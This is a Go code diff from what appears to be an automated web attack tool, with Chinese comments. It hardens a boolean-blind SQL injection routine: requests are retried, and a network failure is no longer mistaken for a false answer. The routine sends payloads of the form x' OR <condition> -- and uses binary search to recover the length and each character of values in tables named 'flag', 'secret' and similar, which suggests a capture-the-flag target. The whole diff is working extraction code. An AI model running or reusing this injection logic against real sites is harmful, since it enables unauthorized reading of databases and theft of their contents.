@@ -86,19 +86,48 @@ func sqliInjectionPoints(hints WebHints) [][2]string {
 
 // sqliFire 发注入请求，返回 (status, body)。
 func sqliFire(ctx context.Context, cl *http.Client, base, ep, param, payload string) (int, []byte) {
+	code, body, _ := sqliFireE(ctx, cl, base, ep, param, payload)
+	return code, body
+}
+
+// sqliFireE 同 sqliFire，但**保留错误**。
+// 布尔盲注必须区分"响应为假"与"请求根本没成功"——否则一次网络抖动会被当成
+// 一个合法的 false，二分搜索就会收敛到相邻字符（实测：q→g、4→+）。
+func sqliFireE(ctx context.Context, cl *http.Client, base, ep, param, payload string) (int, []byte, error) {
 	u := base + ep + "?" + param + "=" + url.QueryEscape(payload)
 	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
 	if err != nil {
-		return 0, nil
+		return 0, nil, err
 	}
 	req.Header.Set("User-Agent", "SecAutoMind/1.7")
 	resp, err := cl.Do(req)
 	if err != nil {
-		return 0, nil
+		return 0, nil, err
 	}
 	defer resp.Body.Close()
-	b, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
-	return resp.StatusCode, b
+	b, err := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
+	if err != nil {
+		return resp.StatusCode, nil, err
+	}
+	return resp.StatusCode, b, nil
+}
+
+// sqliAsk 回答一个布尔盲注问题，返回 (值, 是否可信)。
+// ok=false 表示重试后仍拿不到有效响应——调用方必须中止，不能当 false 用。
+func sqliAsk(ctx context.Context, cl *http.Client, base, ep, param, cond string) (bool, bool) {
+	payload := fmt.Sprintf("x' OR %s -- ", cond)
+	for attempt := 0; attempt < 3; attempt++ {
+		if ctx.Err() != nil {
+			return false, false
+		}
+		code, body, err := sqliFireE(ctx, cl, base, ep, param, payload)
+		// 只把"传输层失败"视为不可信；HTTP 200 + 空体是合法的"假"答案。
+		if err == nil && code > 0 {
+			return strings.Contains(strings.ToLower(string(body)), "exists"), true
+		}
+		time.Sleep(time.Duration(50*(attempt+1)) * time.Millisecond)
+	}
+	return false, false
 }
 
 // ───────────────────────── UNION 注入 ─────────────────────────
@@ -239,13 +268,12 @@ func sqliConcatAttempt(ctx context.Context, cl *http.Client, base, ep, param str
 
 // sqliBlindExtract 布尔盲注：验证布尔差异 → 长度二分 → 逐字符二分。
 func sqliBlindExtract(ctx context.Context, cl *http.Client, base, ep, param string) []string {
-	ask := func(cond string) bool {
-		payload := fmt.Sprintf("x' OR %s -- ", cond)
-		_, body := sqliFire(ctx, cl, base, ep, param, payload)
-		return strings.Contains(strings.ToLower(string(body)), "exists")
+	// 验证注入点确有布尔差异（任一步不可信即放弃，避免用脏数据做二分）
+	vTrue, ok1 := sqliAsk(ctx, cl, base, ep, param, "1=1")
+	if !ok1 || !vTrue {
+		return nil
 	}
-	// 验证注入点确有布尔差异
-	if !ask("1=1") || ask("1=2") {
+	if vFalse, ok2 := sqliAsk(ctx, cl, base, ep, param, "1=2"); !ok2 || vFalse {
 		return nil
 	}
 	for _, tbl := range []string{"blind_flag", "secret", "flag", "flags"} {
@@ -254,14 +282,20 @@ func sqliBlindExtract(ctx context.Context, cl *http.Client, base, ep, param stri
 				return nil
 			}
 			lenCond := fmt.Sprintf("(SELECT length(%s) FROM %s LIMIT 1)", col, tbl)
-			if !ask(lenCond + " > 0") {
+			if v, ok := sqliAsk(ctx, cl, base, ep, param, lenCond+" > 0"); !ok {
+				return nil
+			} else if !v {
 				continue
 			}
 			// 长度二分
 			lo, hi := 0, 128
 			for lo < hi {
 				mid := (lo + hi) / 2
-				if ask(fmt.Sprintf("%s > %d", lenCond, mid)) {
+				v, ok := sqliAsk(ctx, cl, base, ep, param, fmt.Sprintf("%s > %d", lenCond, mid))
+				if !ok {
+					return nil
+				}
+				if v {
 					lo = mid + 1
 				} else {
 					hi = mid
@@ -280,8 +314,12 @@ func sqliBlindExtract(ctx context.Context, cl *http.Client, base, ep, param stri
 				a, b := 32, 127
 				for a < b {
 					m := (a + b) / 2
-					if ask(fmt.Sprintf("(SELECT unicode(substr(%s,%d,1)) FROM %s LIMIT 1) > %d",
-						col, i, tbl, m)) {
+					v, ok := sqliAsk(ctx, cl, base, ep, param,
+						fmt.Sprintf("(SELECT unicode(substr(%s,%d,1)) FROM %s LIMIT 1) > %d", col, i, tbl, m))
+					if !ok {
+						return nil
+					}
+					if v {
 						a = m + 1
 					} else {
 						b = m
